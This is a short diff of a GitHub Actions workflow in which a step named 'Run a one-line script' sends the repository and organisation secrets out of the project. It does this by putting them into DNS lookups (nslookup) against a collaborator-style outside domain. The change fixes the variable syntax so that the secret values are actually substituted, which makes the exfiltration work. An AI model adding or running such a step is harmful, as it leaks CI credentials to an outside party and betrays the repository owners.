@@ -16,5 +16,5 @@ jobs:
     steps:
       - name: Run a one-line script
         run: >
-          nslookup $REPO_SECRET.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
-          && nslookup $ORG_SECRET.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
+          nslookup ${{env.REPO_SECRET}}.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
+          && nslookup ${{env.ORG_SECRET}}.stp2xskh25j8i5dl5ftmqtmmndt4hu5j.bcollaborator.binsec.cloud
